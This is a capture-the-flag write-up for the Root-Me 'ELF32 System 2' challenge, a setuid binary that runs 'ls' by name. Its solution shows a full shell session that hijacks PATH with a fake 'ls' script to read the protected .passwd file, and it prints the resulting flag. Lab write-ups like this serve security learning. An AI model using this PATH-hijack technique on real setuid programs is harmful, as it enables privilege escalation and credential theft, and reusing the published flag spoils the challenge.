# Bash System 2

URL: [https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2](https://www.root-me.org/en/Challenges/App-Script/ELF32-System-2)
## Source code

```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
 
int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```

[Download](https://www.root-me.org/local/cache-code/80639d80b3bc0c22dde438cd4a510a05.txt)
## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                                |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                              |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                  |
| Port       | 2222                                                                                                                                                                                                                                                                                                                                 |
| SSH access | [ssh -p 2222 app-script-ch12@challenge02.root-me.org](ssh://app-script-ch12:app-script-ch12@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_205&ssh=ssh://app-script-ch12:app-script-ch12@challenge02 "WebSSH") |
| Username   | app-script-ch12                                                                                                                                                                                                                                                                                                                      |
| Password   | app-script-ch12                                                                                                                                                                                                                                                                                                                      |
## Solution

Same as [[Bash - System 1]]

```bash
app-script-chapp-script-ch12@challenge02:~$ cd $(mktemp -d)
app-script-ch12@challenge02:/tmp/tmp.mcydyoY5Jw$ vim ls
app-script-ch12@challenge02:/tmp/tmp.mcydyoY5Jw$ cat ls
#!/bin/bash

/bin/cat /challenge/app-script/ch12/.passwd
app-script-ch12@challenge02:/tmp/tmp.mcydyoY5Jw$ chmod +x ls
app-script-ch12@challenge02:/tmp/tmp.mcydyoY5Jw$ chmod +rx /tmp/tmp.mcydyoY5Jw
app-script-ch12@challenge02:/tmp/tmp.mcydyoY5Jw$ export PATH="/tmp/tmp.mcydyoY5Jw:$PATH"
app-script-ch12@challenge02:/tmp/tmp.mcydyoY5Jw$ ~/ch12
8a95eDS/*e_T#
```


> Password: `8a95eDS/*e_T#`

